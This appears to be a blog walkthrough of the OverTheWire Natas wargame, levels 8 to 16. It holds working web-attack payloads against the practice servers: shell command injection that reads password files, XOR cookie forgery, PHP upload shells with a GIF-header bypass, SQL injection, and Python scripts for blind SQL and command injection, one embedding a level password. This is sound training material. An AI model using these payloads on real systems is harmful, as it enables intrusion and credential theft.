---
layout: post
title: OverTheWire - Natas 8-16
---

Site: http://overthewire.org/wargames/natas/ <br>
Level: 8-16<br>
Situation: Basic Web <br><br>

### Natas 8
- - - - - - -

Looking at natas8 we are presented with a similar form and if we put in random text it tells us we are incorrect. Looking at the source code we are given the following.

{% highlight php %}
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
{% endhighlight %}

We can see that our input is passed into the encodeSecret() function that in turn does the following.

{% highlight bash %}
bin2hex(strrev(base64_encode($secret)));
{% endhighlight %}

First function turns a bit of text into hex so we need to do that first. Giving us this.

{% highlight bash %}
==QcCtmMml1ViV3b
{% endhighlight %}

After that we need to reverse the string which strrev does. Making it the following.

{% highlight bash %}
b3ViV1lmMmtCcQ==
{% endhighlight %}

Finally we run it through a base 64 decoder and finally we get the following.

{% highlight bash %}
oubWYf2kBq
{% endhighlight %}

There is our secret string we put it in the input field and we are presented with the password.

### Natas 9
- - - - - - -

Now we have another form. When we enter a word it seems to show only things with that word. Also same for characters. Looking at the source we are presented with the following.

{% highlight php %}
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
{% endhighlight %}

We can see as long as the key needle exist in our URL and it’s not empty it gets passed through to "passthru" which executes the system command grep. Now knowing how Linux command structure works we know we can execute more commands if we put a semi colon.

To test it we put the following input.

{% highlight bash %}
c; ls -la
{% endhighlight %}

Gives us the following result.

{% highlight bash %}
-rw-r----- 1 natas9 natas9 460878 Nov 14 10:27 dictionary.txt
{% endhighlight %}

If we cat dictionary.txt it is literally nothing but a dictionary. So we need to search our operating system. So we execute the following command.

{% highlight bash %}
c; ls -la /*/*/** 
{% endhighlight %}

If we ctrl+f for "natas10" eventually we find the following.

{% highlight bash %}
-r--r-----   1 natas10    natas9           33 Nov 14 10:32 /etc/natas_webpass/natas10
{% endhighlight %}

Looks promising. We now go ahead and see if we can read it.

{% highlight bash %}
c; cat /etc/natas_webpass/natas10
{% endhighlight %}

It displays our password.

### Natas 10
- - - - - - -

We are presented with a new form that is similar to the previous and a message saying characters are censored now. If we look at the source we get the following.

{% highlight php %}
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
{% endhighlight %}

The regex checks the entire string for the following characters ';|*' which completely blocks our last attempt however. We can still pass a path to the application. By using ".*" we are telling it to show everything. We will also add a # to comment out the dictionary.txt so our path is the one searched.

{% highlight bash %}
.* /etc/natas_webpass/natas11 #
{% endhighlight %}

When we input that we are given the following with our password.

{% highlight bash %}
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
/etc/natas_webpass/natas11:[OMITTED]
{% endhighlight %}

### Natas 11
- - - - - - -

When we are presented with natas 11 we are given a small input field that takes an RGB color and sets the color. Nothing to interesting. We also get the message that the cookies are protected using XOR. Meaning this is going to be a little bit of an annoyance. When we view the source code we get the following.

{% highlight php %}
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
$data = loadData($defaultdata);
if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}
saveData($data);
?>
{% endhighlight %}

Reading it we notice that there is indeed a bit of stuff going on specifically the function to encrypt and decrypt everything. We aren’t given the key so we must first find it before we can complete the challenge.

After doing some reading on XOR and how it works after I’ll be a bit too long of attempting to brute force the key. We learn that although yes xor(original_data,key) = encrypted data.  xor(original_data,encrypted_data) = key is also true.

So thankfully we do indeed have the original data and the encrypted data at our disposal. So we are going to modify the code presented to us and use it to find our key.

{% highlight php %}
<?php
$cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
function xor_encrypt($in) {
    global $defaultdata;
    $text = $in;
    $key = json_encode($defaultdata);
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
print xor_encrypt($cookie);
?>
{% endhighlight %}

After running locally we get the following. 

{% highlight bash %} 
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
{% endhighlight %}

Safe to assume "qw8J" is our key.

Now we can use this key to generate the correct cookie. We know that we have to first json_encode our data then xor_encrypt and finally base64 encode our cookie so we modify our code to do that for us.

{% highlight php %}
<?php
$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
function xor_encrypt($in) {
    $text = $in;
    $key = "qw8J";
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
print base64_encode(xor_encrypt(json_encode($defaultdata)));
?>
{% endhighlight %}

Now all we do is replace the cookie with our new value.

![Embeded](/images/natas/screen5.png)
[FullSize](/images/natas/screen5.png)

We hit apply and refresh the page and the password is displayed.

### Natas 12
- - - - - - -

Natas12 presents us with an upload form that takes a 1KB image and uploads it to a random location and filename. If we upload a PHP file we are returned a random URL with PHP replace with jpg and our code doesn’t execute. At first trying file.php.jpg we think it would go through and it doesn’t.

So moving to the source code we are given the following.

{% highlight php %}
<?  
function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 
function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 
if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 
{% endhighlight %}

Now we can confirm that our file is getting uploaded and put given a random location but nowhere is the extension being modified if we look close however we find the problem.

{% highlight html %}
<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
{% endhighlight %}

Our file name isn't being passed at all in fact a new one is being generated for it. Thankfully this is easy to do as we can inline edit html using chrome. So to test this we first create a simple PHP file we want to upload.

{% highlight php %}
// test.php
<?php
phpinfo();
?>
{% endhighlight %}

Now we inline edit the html code. By double clicking and changing the .jpg extension to .php.

![Embeded](/images/natas/screen6.png)
[FullSize](/images/natas/screen6.png)

When we upload our test.php file we are taken to a link and when we open that link phpinfo() executes and shows us the information we need. Now all we need to do is rewrite this script and have it read the file we specifically need.

{% highlight php %}
<?php
$myfile = fopen("/etc/natas_webpass/natas13", "r") or die("Unable to open file!");
echo fread($myfile,filesize("/etc/natas_webpass/natas13"));
fclose($myfile);
?>
{% endhighlight %}

After uploading and running we are presented with the password.

### Natas 13
- - - - - - -

Natas 13 is very similar to natas 12 however there is an additional check with exif_imagetype() on our file.

{% highlight bash %}

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
}
{% endhighlight %}

Reading the documentation for exif_imagetype we get the following.

{% highlight bash %}
exif_imagetype() reads the first bytes of an image and checks its signature.

When a correct signature is found, the appropriate constant value will be returned otherwise the return value is FALSE
{% endhighlight %}

Simply googling exif_imagetype() returns various resources regarding getting past it. Basically since all it checks is the first few bytes of the file for an image identifier you can supply one and then have your PHP code under it. So to do that we add "GIF89a" to the top of our file and it will confirm that the file is a gif. So we turn our PHP code into.

{% highlight php %}
GIF89a
<?php
$myfile = fopen("/etc/natas_webpass/natas14", "r") or die("Unable to open file!");
echo fread($myfile,filesize("/etc/natas_webpass/natas14"));
fclose($myfile);
?>
{% endhighlight %}
 
When uploaded and ran we get our password.

### Natas 14
- - - - - - -

We are given a username and password field. When data is entered we are given "access denied". So straight to the source we go.

{% highlight bash %}
<? 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
} else { 
?> 
{% endhighlight %}

We have code that deals with a SQL connection. If we look at the query string we notice that it is taking our data directly from the request and sticking it in their query string. Showing that basic SQL injection is possible. The SQL string looks like this after removing the escape characters.

{% highlight bash %}
$query = "SELECT * from users where username=".$_REQUEST["username"]" and password=".$_REQUEST["password"]"; 
{% endhighlight %}

We can immediately see where our SQL injection will go. Our injection looks as follows.

{% highlight bash %}
username" OR "a"="a
{% endhighlight %}

What is happening is we are closing out the first select statement and adding an additional OR condition. Meaning if we find a user named username, which we don't OR if "a" is equal to "a" which it is. After injecting both the username and password fields with this we are presented with our password.

### Natas 15
- - - - - - -

Natas 15 presents us with a similar form however it only takes a username value. When we enter a user we get only a simple response if the user exists or not. If we look at the source we are given the following.

{% highlight php %}
<? 
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
    mysql_select_db('natas15', $link); 
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 
    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        echo "This user exists.<br>"; 
    } else { 
        echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        echo "Error in query.<br>"; 
    } 
    mysql_close($link); 
} else { 
?> 
{% endhighlight %}

Now we know it is vulnerable to the same vulnerability as the previous one. But we are getting no output other than a simple "user exist".
We do get a hint we know that the table "users" contains a password column. We can use "user exist" as a boolean value to let us know when a query passed.
We this type of enumeration is known as blind SQL injection. To do this we first need to find a user that exist. As we could have guessed the user is natas16.

Now to pull this injection off we are going to utilize case sensitive SQL like statements. The statement we want to execute looks as follows.

{% highlight sql %}
natas16" and password COLLATE latin1_bin like "<characterhere>%
{% endhighlight %}

The like keyword works by looking patterns in the password table. The % is a wildcard. So we check each character in the string at a time till a match is found. Let’s go a step further and automate this with python.

{% highlight python %}
#blind.py
import requests
from requests.auth import HTTPBasicAuth
letters = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
solution = ""
for x in range(33):
    for c in letters:
        payload = {'username': 'natas16" and password COLLATE latin1_bin like "'+solution+c+'%'}
        r = requests.post("http://natas15.natas.labs.overthewire.org/", data=payload, auth=HTTPBasicAuth('natas15', 'natas15password'))
        if "This user exists." in r.text:
            solution = solution + c
            print "Solution: " + solution
print "Final: "+solution
{% endhighlight %}

After running our script we are presented with the password.

### Natas 16
- - - - - - -

Similar to natas 15 we are doing another blind search. Natas 15 gives up another form and more restrictions on the challenge we saw in natas9. It filters out the following characters 

{% highlight bash %}
;&`\'"|
{% endhighlight %}

This makes things rather difficult for us. However we still have access to % and () meaning we can execute commands. Unfortunately the easy route of wgeting a PHP script and allowing it to grab our password for us didn't work so we are stuck with using greps functionality to do a blind lookup.

To do this we are going to insert another grep command that checks if a character is in a file if it is its going to append it to a word of our choice. The grep command looks as follows.

{% highlight bash %}
grep -i $(grep a /etc/natas_webpass/natas17)Doctor dictionary.txt
{% endhighlight %}

We know doctor exist in our dictionary. So what happens is the grep within $() is execute first if the letter is in an it will append it to the string Doctor making it aDoctor. Since there is no aDoctor in dictionary.txt we can assume that if Doctor is in our html then the character didn't match however if it isn't there then we have a match. Let’s modify the python code from the previous challenge to do this for us.

{% highlight python %}
import requests
from requests.auth import HTTPBasicAuth

letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
solution = ""
noresult = False
for x in range(35):
    for c in letters:
        payload = "?needle="+"$(grep -E ^" + solution+c + ".* /etc/natas_webpass/natas17)Doctor"
        r = requests.get("http://natas16.natas.labs.overthewire.org"+payload, auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if not "Doctor" in r.text:
            solution = solution + c
            print "Solution: " + solution
            break
print "Final: "+solution
{% endhighlight %}

We use regular expression flag of grep to ensure that we are searching from the beginning of the file and not the middle.
"Learned the hard way" After running we get our password.